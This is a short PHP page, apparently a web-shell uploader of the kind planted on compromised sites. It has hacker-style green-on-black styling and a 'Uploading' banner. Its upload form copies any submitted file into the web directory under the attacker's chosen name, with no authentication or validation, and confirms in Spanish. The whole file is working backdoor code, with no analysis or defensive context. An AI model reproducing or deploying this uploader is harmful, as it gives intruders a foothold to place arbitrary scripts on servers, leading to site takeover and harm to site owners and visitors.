<style type="text/css">
body {
  color: #33ff33;
  background-color: black;
  font-weight: inherit;
}
h1,h2{
  background-color: #4D4D4D;
  color: #000000;
  text-align: center;
}
h3,h4,h5{
  color: silver;
  text-align: center;
}
</style>
<b><br>
<h1> Uploading </h1>
<br><br>
<center>
<font color:"blue">
<span style="font-family: monospace;">
<span style="color: rgb(255, 255, 255);">
<br><br>
<font color="black"></font>
<br></b> <?php
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50">
<input name="_upl" type="submit" id="_upl" value="Upload">
</form>'; if( $_POST['_upl'] == "Upload" ) { if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name']))
{
echo '<b>Archivo subido!</b><br><br>';
}
else
{
echo '<b>Upload Fail!</b><br><br></font>';
}
}

?>
